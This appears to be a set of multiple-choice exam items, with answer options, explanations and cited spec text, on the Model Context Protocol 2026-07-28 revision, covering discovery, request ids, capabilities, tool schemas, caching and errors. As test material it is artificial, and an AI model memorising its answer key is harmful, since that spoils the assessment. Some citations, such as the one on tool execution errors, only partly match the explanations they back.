q.en: A team preparing for a production launch wants one end-to-end rehearsal that exercises discovery, a validated tool call, a consent round trip, and audit logging together, rather than testing each in isolation. What kind of exercise does this describe?

o.en: A registry namespace verification check performed once before any server is first published
An integrated readiness rehearsal spanning discovery, execution, consent, and audit together
A load test that only measures raw requests successfully processed per second overall
A narrow unit test that only exercises a single JSON Schema validator function

x.en: Rehearsing one full exchange that touches discovery, validated tool execution, MRTR consent, and audit logging together is an integrated readiness check spanning every domain, which is a different exercise from a narrow unit test, a pure throughput load test, or a registry ownership check.

q.en: A team is connecting a nightly batch job, with no human present, to an MCP server for a machine-to-machine integration. Ordinary user-facing OAuth consent screens do not fit this case. What should the team reach for?

o.en: URL-mode elicitation, since it is specifically designed for out-of-band human approval
A server-minted handle, since such handles fully replace authorization for automated batch clients
The OAuth Client Credentials extension, built for machine-to-machine clients such as CI or daemons
Dynamic Client Registration, since it removes the need for any authorization at all

x.en: The OAuth Client Credentials extension is built for machine-to-machine clients like CI jobs and daemons that have no human present to complete an interactive consent flow, unlike elicitation which needs a human, DCR which only registers a client rather than removing authorization, or handles which address state, not identity.

cite.text: The OAuth Client Credentials extension (`io.modelcontextprotocol/oauth-client-credentials`) adds support for the OAuth 2.0 client credentials flow to MCP. This enables automated systems to connect to MCP servers without interactive user authorization.

q.en: A platform team is choosing an SDK to build a new production MCP server and wants strong guarantees about spec conformance and how fast critical bugs get fixed. Which SDK tier should they prefer, all else equal?

o.en: Tier 3, since experimental SDKs get the newest features first
Whichever tier has the largest download count, since popularity is the only signal that matters
Tier 2, since an 80 percent conformance pass rate is the ecosystem norm
Tier 1, since it passes full conformance tests and commits to fast triage and bug fixes

x.en: SDK tiering gives Tier 1 the strongest guarantees, full conformance test passage plus fast triage and critical bug fix commitments, which matters directly for a production deployment, while Tier 2 accepts a lower conformance bar and Tier 3 is explicitly experimental regardless of its download popularity.

cite.text: Conformance Tests | 100% pass rate | 80% pass rate | No minimum

q.en: A working group wants to incubate a new MCP extension in the open before proposing it as an official one. Where does that early work belong under the extensions process?

o.en: In an experimental-ext- repository owned by a Working Group or Interest Group
Directly inside the core specification's draft, since every extension starts as a core feature
In any private fork, since extensions need no public process before clients adopt them
Under the io.modelcontextprotocol prefix right away, since official status comes with publication

x.en: Experimental extensions live in repositories with the experimental-ext- prefix that belong to a Working Group or Interest Group; becoming official goes through an Extensions Track SEP with a reference implementation in an official SDK and review by the Core Maintainers. The io.modelcontextprotocol prefix is not claimed by publishing, and extensions stay out of the core specification.

cite.text: An Experimental extension lives either under `specification/experimental/` in an existing `ext-` repository, or in its own repository with the `experimental-ext-` prefix (e.g., `experimental-ext-interceptors`). Everything in an `experimental-ext-` repository is Experimental.

q.en: An aggregator team plans to mirror the official MCP Registry into its own catalog for customers. What does the registry's current status tell the team to plan for?

o.en: A mandatory security scan of every package, since the registry certifies server code
Breaking changes or data resets before general availability, since the registry is in preview
Paid access tiers, since mirroring the registry requires a commercial license agreement
Nothing special, since the registry is generally available with a frozen data model

x.en: The MCP Registry is in preview, and its maintainers warn that breaking changes or data resets may happen before general availability, so an aggregator should design for re-syncs and schema changes. The registry hosts metadata and delegates security scanning to package registries and downstream aggregators; it does not certify server code.

cite.text: The MCP Registry is currently in preview. Breaking changes or data resets may occur before general availability. If you encounter any issues, please report them on GitHub.

q.en: A host developer is implementing support for the MCP Apps extension and reading how the UI resource's own metadata constrains the sandboxed iframe. Which three statements are correct? Select three.

o.en: The UI resource is fetched through an ordinary resources/read call and carries the mime type text/html;profile=mcp-app
When the UI resource's metadata omits csp entirely, the host must apply a restrictive default that blocks outgoing connections
Requesting camera or microphone access through the permissions metadata grants it automatically without any host involvement
The UI resource's csp metadata is an object of domain lists, such as connectDomains and frameDomains, not one flat list of allowed origins

x.en: The csp metadata on the UI resource is structured as domain-list fields such as connectDomains, resourceDomains, frameDomains, and baseUriDomains rather than a flat origin list, an omitted csp forces a restrictive default that blocks outgoing connections, and the resource itself is retrieved with a normal resources/read call carrying the mcp-app HTML profile. Permissions such as camera and microphone are never granted automatically just because an app asks for them.

cite.text: This specification focuses on HTML content (`text/html;profile=mcp-app`) as the initial content type, with extensibility for future formats.

q.en: A capstone readiness review is checking whether a team's end-to-end rehearsal actually covers the full 2026-07-28 surface before certification. Which three elements should the rehearsal include? Select three.

o.en: Audience validation of the token presented for the server, rejecting one issued for another resource
A legacy initialize handshake, kept in the main request path so both eras share one code path
Trace context propagated end to end so the exchange can be attributed and reviewed afterward
An MRTR consent round trip using a new request id and an integrity-protected requestState

x.en: A thorough readiness rehearsal exercises a proper MRTR consent round trip, strict audience validation against token misuse, and end-to-end trace propagation for auditability. A legacy initialize handshake does not belong in the 2026-07-28 main path, since that request was removed rather than kept as a shared code path.

cite.text: Audience. Your MCP server must reject tokens that weren't issued for it. The `resource` value from the client should become the token's audience, which is the `aud` claim in a JWT. Some products need a setting for this, or let you configure the audience on a scope instead. Others always use their own identifier. In that case, compare the audience with that identifier, and keep your server's URL as the PRM `resource`. The identifier must belong to this MCP server only, so don't share one application registration between servers.

q.en: A client sends this JSON-RPC message to a server: {"jsonrpc":"2.0","id":null,"method":"tools/call","params":{"name":"get_weather","arguments":{}}}. What is wrong with this request under MCP 2026-07-28?

o.en: The params object must always include a resultType field on every outgoing request
The id field must not be null, since a request id must be a non-null string or integer value
The method name must start with a forward slash before the primitive category
Tool arguments must always be sent as a JSON array of positional values instead of a JSON object of named values

x.en: JSON-RPC requests carry a unique identifier so responses can be correlated, and MCP requires that identifier to be a string or integer that is never null. A null id makes the request impossible to distinguish cleanly and violates the base protocol rule that every request id must be a real value.

cite.text: Requests MUST include a string or integer ID. - Unlike base JSON-RPC, the ID MUST NOT be `null`. - The request ID MUST NOT match the ID of any other request the sender has issued and not yet received a response for.

q.en: A server emits this message on a Streamable HTTP response stream: {"jsonrpc":"2.0","id":42,"method":"notifications/progress","params":{"progressToken":42,"progress":1}}. What structural rule does this message break?

o.en: A progressToken must always match the jsonrpc version string rather than a request id
The progress value must be expressed as a percentage between zero and one hundred
A notification must never include an id field, since the sender expects no reply
Progress notifications must always be delivered on a dedicated subscriptions/listen stream

x.en: Notifications are one-way messages that the receiver must not answer, and the base protocol marks that by omitting the id entirely. Including an id on a notifications method conflates it with a request awaiting a response, which breaks the request and notification distinction the whole message model relies on.

cite.text: Notifications are sent from the client to the server or vice versa, as a one-way message. The receiver MUST NOT send a response.

q.en: The deprecated features registry lists Dynamic Client Registration as deprecated in the 2026-07-28 revision, with no removal date yet announced. What can a reader conclude about its earliest possible removal?

o.en: It can never be removed because deprecated features are permanent once documented in the registry
It will be removed automatically in exactly six months regardless of any later revision dates
It was already removed the moment the registry entry was published alongside the deprecation notice
It can be removed in any revision released at least twelve months after that deprecating revision

x.en: The feature lifecycle policy sets a minimum twelve month window between a deprecation and its earliest removal, measured from the release of the deprecating revision, and even then removal requires a Core Maintainer decision rather than happening on a fixed schedule. A deprecated feature keeps working during that entire window.

review.note: Testo corretto: l'originale attribuiva la deprecazione di DCR a SEP-2577, che invece depreca roots, sampling e logging. DCR è deprecata nella stessa revisione 2026-07-28 da un'altra modifica (PR #2858). / Fixed: the original attributed the DCR deprecation to SEP-2577, which deprecates roots, sampling and logging.

cite.text: Individual features of the specification may additionally be marked as Deprecated under the feature lifecycle and deprecation policy: the feature remains part of the specification, but is scheduled for removal. Deprecated features document a migration path (or state that none is required) and remain in the specification for at least twelve months, or at least ninety days under the policy's expedited-removal exception, before they become eligible for removal, after which they may be Removed in a future revision.

q.en: A single client sends a server/discover request carrying "io.modelcontextprotocol/protocolVersion":"2026-07-28" and an empty clientCapabilities object to two unrelated servers it has never talked to before, and successfully lists tools from both. Which claim about MCP does this best support?

o.en: MCP standardizes the connection so one client implementation can reach many unrelated servers
MCP replaces the need for any AI model to select which tool to call
MCP requires every server to expose an identical set of tool names and schemas
MCP guarantees that a server will remain reachable for the lifetime of the client

x.en: The integration problem MCP solves is that many applications and many systems would otherwise need custom glue for every pair, and one client discovering and calling two unrelated servers through the same request shape shows that a shared protocol turns that combinatorial problem into far fewer implementations instead.

cite.text: MCP takes some inspiration from the Language Server Protocol, which standardizes how to add support for programming languages across a whole ecosystem of development tools. In a similar way, MCP standardizes how to integrate additional context and tools into the ecosystem of AI applications.

q.en: A dual-era client probing an unfamiliar stdio server sends a server/discover request with a protocol version the server does not implement, and receives back a JSON-RPC error with code -32022 whose data carries supported ["2026-07-28"] along with the requested version. What should the client do next?

o.en: Treat the server as unreachable and stop attempting any further requests on that connection
Retry the original request using a version drawn from the data.supported list in that error
Immediately fall back to sending a legacy initialize handshake instead of retrying discover
Resend the identical server/discover request unchanged and expect a different result the second time

x.en: An UnsupportedProtocolVersionError is a recognized modern error that names the versions the server does support, so a dual era client should retry with a mutually supported version rather than assuming the server is legacy. Falling back to initialize on a recognized modern error is exactly the trap the era detection rule warns against.

cite.text: If the body contains a recognized modern JSON-RPC error, the server speaks a modern version of MCP — retry using the advertised `supported` versions or correct the request, rather than falling back. - If the body is empty or is not a recognized modern JSON-RPC error, fall back to `initialize` and continue with the legacy version for subsequent requests.

q.en: A basket tool returns {"content":[{"type":"text","text":"basket handle: bh_8f21"}],"structuredContent":{"basketHandle":"bh_8f21"}}, and the client passes bh_8f21 back as an ordinary argument on the next tools/call. What does this pattern illustrate about MCP 2026-07-28?

o.en: The server must open a persistent socket connection dedicated to that one basket handle
Handles replace the need for the server to authorize the caller on later calls
State that spans requests must be carried as an explicit argument rather than a session
Every tool call automatically inherits the arguments supplied by the previous tool call

x.en: Because the protocol core is stateless, a server cannot remember a basket across separate requests through connection state alone. The handle pattern lets state that spans requests travel explicitly as an ordinary argument, with the server still authorizing the caller and checking the handle on every call it receives.

cite.text: MCP has no protocol-level session, so a server cannot rely on implicit per-connection state to relate one tool call to the next. Servers that need to maintain state across calls — a shopping cart, an open browser context, a database transaction — should do so by returning an explicit handle from a creation tool and accepting that handle as an argument on subsequent calls.

q.en: While studying, a candidate reads four short claims about MCP 2026-07-28 and must pick the one that is not a legacy-era assumption left over from earlier revisions. Which claim is accurate for the current revision?

o.en: A connection opens with an initialize request before any other method can be called
A session id returned during setup must be reused on every later request
The server remembers a client's declared capabilities from one request to the next
Version and capability information travels as per-request metadata rather than a handshake

x.en: The 2026-07-28 revision removed the initialize handshake and protocol sessions entirely, so version and capability information must be included with every request through per-request metadata fields instead of being negotiated once and remembered afterward. The other three claims describe the removed legacy model, a common distractor pattern on this exam.

cite.text: Modern: protocol versions that convey version, identity, and capabilities as per-request metadata (revision `2026-07-28` and later). - Legacy: protocol versions that establish a session with an `initialize` handshake (`2025-11-25` and earlier). - Dual-era: an implementation that supports both modern and legacy versions.

q.en: A client sends {"jsonrpc":"2.0","id":4,"method":"tools/list","params":{"_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28"}}} over Streamable HTTP. How should a 2026-07-28 server respond?

o.en: Reject it with -32602 and HTTP 400, since clientCapabilities is a required _meta field
Reject it with -32601 and HTTP 404, since a method cannot run without capabilities
Answer normally, reusing the capabilities this client declared on an earlier request
Answer normally, assuming the client supports every capability since it declared none

x.en: Every 2026-07-28 request must carry both io.modelcontextprotocol/protocolVersion and io.modelcontextprotocol/clientCapabilities in params._meta, and a request missing a required _meta field is invalid params, -32602, with HTTP 400. A stateless server cannot borrow capabilities from an earlier request, and -32601 is reserved for an unknown method.

cite.text: A request missing any required field is malformed; the server MUST reject it with JSON-RPC error code `-32602` (Invalid params). On HTTP, the response status MUST be `400 Bad Request`.

q.en: A server author reviews four candidate _meta field names for custom data: io.modelcontextprotocol/session, dev.mcp/subscription-window, com.example.mcp/session, and com.example/subscription-window. Which two are reserved for MCP's own use rather than available to a third party? Select two.

o.en: A field named dev.mcp/subscription-window
A field named io.modelcontextprotocol/session
A field named com.example.mcp/session
A field named com.example/subscription-window

x.en: A prefix counts as reserved only when its second dot separated label is exactly modelcontextprotocol or mcp, which is true for io.modelcontextprotocol and dev.mcp. The example.mcp prefix has example as its second label rather than mcp, so despite containing those letters later it is not reserved, and a plain com.example prefix is clearly third party.

cite.text: Any prefix where the second label is `modelcontextprotocol` or `mcp` is reserved for MCP use.

q.en: A client calls a tool named archive_invoice on a server that never defined it, and receives {"jsonrpc":"2.0","id":9,"error":{"code":-32602,"message":"Unknown tool: archive_invoice"}}. What does this exchange illustrate about how MCP standardizes integrations?

o.en: Every MCP server must implement the exact same tool names so clients never see this error
Each server defines its own tool surface, and clients discover it rather than assuming a shared fixed catalog
Unknown tool names sent by any client are always silently ignored by the server rather than being returned as an explicit error
The client should have used method notifications/tools/list_changed to avoid this particular error entirely

x.en: MCP does not standardize which tools exist, only how a client asks what tools exist and how it calls them, so a server is free to not implement a given tool and the client must discover the real surface through tools/list rather than assuming a universal catalog. That is what keeps the protocol generic across unrelated systems.

cite.text: The client can discover available tools by sending a `tools/list` request. This request is fundamental to MCP's tool discovery mechanism: it allows clients to understand what tools are available on the server before attempting to use them.

q.en: A host connects to two servers whose discover results both carry "_meta":{"io.modelcontextprotocol/serverInfo":{"name":"files","version":"1.0.0"}}. How should the host key its routing table for these two connections?

o.en: By serverInfo.version, since the version string separates servers that share a name
By whichever server answered discovery first, since later duplicates must be dropped
By an identifier the host assigns to each connection, since serverInfo is self-reported
By serverInfo.name, since the specification guarantees that server names are unique

x.en: serverInfo is self-reported display and logging metadata, so two unrelated servers can report the same name and version. The host owns its connections and should route by an identifier it assigns to each one, never by a value a server chose for itself.

cite.text: `serverInfo` is self-reported by the server and is not verified by the protocol. It is intended for display, logging, and debugging. Clients SHOULD NOT use it to change their behavior, and SHOULD NOT rely on it for security decisions.

q.en: A server answers server/discover with {"jsonrpc":"2.0","id":3,"result":{"resultType":"complete","instructions":"Use tools for weather lookups."}}. What is missing from this DiscoverResult?

o.en: A cursor field so the client can request the next page of capabilities
A serverInfo object nested directly under result rather than under result._meta
An inputRequests map describing which elicitation request the server needs answered first
The supportedVersions and capabilities fields, plus the ttlMs and cacheScope caching fields

x.en: DiscoverResult is defined as a cacheable result that must carry supportedVersions and capabilities as its core content, along with ttlMs and cacheScope because server/discover is one of the operations whose complete result must include caching hints. None of those required fields appear in this response.

cite.text: The result is marked `"resultType": "complete"` and carries two caching fields. `ttlMs` is a freshness hint in milliseconds, so this tool list can be cached for five minutes. `cacheScope` indicates who may reuse the response. The specification's caching utility defines the full rules.

q.en: A server rejects a tools/call with {"jsonrpc":"2.0","id":21,"error":{"code":-32021,"message":"Missing required client capability"}}. Why is this error response incomplete?

o.en: It needs data.requiredCapabilities, naming what the client must declare to succeed
It needs resultType set to input_required so the client can answer the capability question
It needs data.supported, listing the protocol versions that the server accepts
It needs an HTTP 404 status, since a missing capability means the method is unknown

x.en: MissingRequiredClientCapability tells the client exactly what to add: its data carries requiredCapabilities, the capabilities the client must declare when it retries. data.supported belongs to UnsupportedProtocolVersionError, the HTTP status for this error is 400 rather than 404, and an error response never carries a resultType.

cite.text: A server MUST NOT rely on capabilities the client has not declared. If processing a request requires a capability the client did not include in `io.modelcontextprotocol/clientCapabilities`, the server MUST return a `MissingRequiredClientCapabilityError` (`-32021`) whose `data.requiredCapabilities` lists the missing capabilities. On HTTP, the response status MUST be `400 Bad Request`.

q.en: A tool definition includes "inputSchema": {"properties": {}}, with no type keyword at the root. What must be corrected for this to be a valid MCP tool definition?

o.en: The properties field must be renamed to arguments to match the tools/call request shape
The root of inputSchema must declare type object, since tool arguments are always a JSON object
An outputSchema must always be declared whenever an inputSchema is present on a tool
The schema must also set additionalProperties to true so that any unknown extra arguments are silently accepted

x.en: Tool arguments are always JSON objects, so the specification requires type object at the root of inputSchema even though most other JSON Schema 2020-12 keywords are optional and flexible. Without that root type declaration the schema does not describe a valid call shape for the tool.

cite.text: The `inputSchema` field retains the `type: "object"` requirement (since tool arguments are always objects), but now accepts any additional JSON Schema properties. This enables:

q.en: A tool defines an outputSchema and its CallToolResult includes both content and structuredContent. Which two statements about this pattern are correct under MCP 2026-07-28? Select two.

o.en: structuredContent must always be a JSON object and can never be a plain string, number, or array
A tool without any outputSchema is not permitted to ever include a structuredContent field
The structuredContent should conform to the declared outputSchema and also be mirrored into a text block
Arguments that violate the tool's inputSchema come back as isError true rather than a protocol error

x.en: structuredContent can be any JSON value, and when an outputSchema exists the server should make it conform while also serializing it into a text block for clients that only read content. Separately, schema violations in tool arguments are reported as a normal result with isError true so the model can see and correct them, not as a JSON-RPC error.

cite.text: *Structured content is returned as a JSON value in the `structuredContent` field of a result. This can be any JSON value (object, array, string, number, boolean, or null) that conforms to the tool's `outputSchema` if one is defined.

q.en: A reviewer reads a manifest entry for a tool named delete_record with no annotations block at all, whose result carries {"cacheScope":"public","ttlMs":60000} even though the data it returns is specific to one authenticated user. Which two observations belong in the review? Select two.

o.en: With no annotations present, the effective destructiveHint defaults to true, so this tool should be treated as capable of destructive changes
Because cacheScope is set to public here, the server has already enforced correct access control for this data
A public cacheScope on a result containing one user's private data risks that response being served to a different user
The missing annotations block means the server has violated the specification and the manifest must be rejected outright

x.en: Tool annotations are optional hints with real defaults, so an absent annotations block still implies destructiveHint true, which a reviewer should flag rather than assume the tool is safe. Separately, cacheScope public is a sharing hint, not an access control, so pairing it with per-user data is a genuine risk regardless of how the response happens to be cached.

cite.text: ToolAnnotations: readOnlyHint (Default: false); destructiveHint: If true, the tool may perform destructive updates to its environment (Default: true); idempotentHint (Default: false); openWorldHint (Default: true).

q.en: A model calls a tool with a malformed date argument and the client receives back a CallToolResult with isError true and content explaining the expected date format. What happens next in the interaction flow?

o.en: The server closes the connection because an isError result always ends the current interaction
The client automatically retries the exact same arguments a second time without involving the model
The tool execution error is added to model context so the model can revise arguments and call again
The host discards the conversation and starts an entirely new request to the model from scratch

x.en: Tool execution errors are deliberately returned as ordinary results with isError true precisely so their explanatory content re-enters model context, letting the model reason about what went wrong and issue a corrected tools/call. Discarding the conversation or blindly retrying identical arguments would both defeat that self-correction design.

cite.text: Language models can learn from tool input validation error messages and retry a tools/call with corrected parameters accordingly, but only if they receive the error feedback in their context window. Protocol Errors are catch at the application level by the MCP Client. Only Tool Execution Errors are forwarded back to the model as JSON-RPC responses. With the current specifications, models cannot see these error messages and thus cannot self-correct, leading to repeated failures and poor user experiences.

q.en: A host builds model context for a turn where the model will decide whether to call a tool. Which information actually becomes part of what the model sees?

o.en: The authorization server's private signing key used to validate the client's bearer token
The server's internal process id and the file system path where it is installed
The raw HTTP headers such as Mcp-Method that the client attached to the previous request
The tool's name, description, and input schema, plus the content of any prior results

x.en: The model reasons only over what the host places in its context: tool names, descriptions, schemas, and the content of results including tool execution errors. Transport level headers, server process internals, and authorization secrets never belong in that context and must stay outside what the model can see.

q.en: A tool result includes this embedded resource content block on one line: {"type":"resource","resource":{"uri":"file:///report.txt","mimeType":"text/plain","text":"Q3 totals","annotations":{"audience":["user"]}}}. Where does the schema say annotations actually belongs on this content block?

o.en: Beside resource as a sibling field on the EmbeddedResource block itself, not nested inside it
Inside a separate _meta.annotations key rather than as a top level annotations field at all
Nested inside the resource object exactly as shown, since ResourceContents defines its own annotations field
Only on the outer CallToolResult, never on an individual embedded resource content block

x.en: The schema defines EmbeddedResource with an annotations field alongside its resource field, while ResourceContents itself carries no annotations property. A tool result that nests annotations inside the resource object instead of placing it as a sibling field does not match the structure the schema actually defines.

cite.text: Content Types: Each content object has a `type` field. In this example, `"type": "text"` indicates text content. Tool results can also contain images (`image`), audio (`audio`), resource links (`resource_link`), and embedded resources (`resource`). Not every model accepts all of these types, so clients may need to handle content that their model does not support.
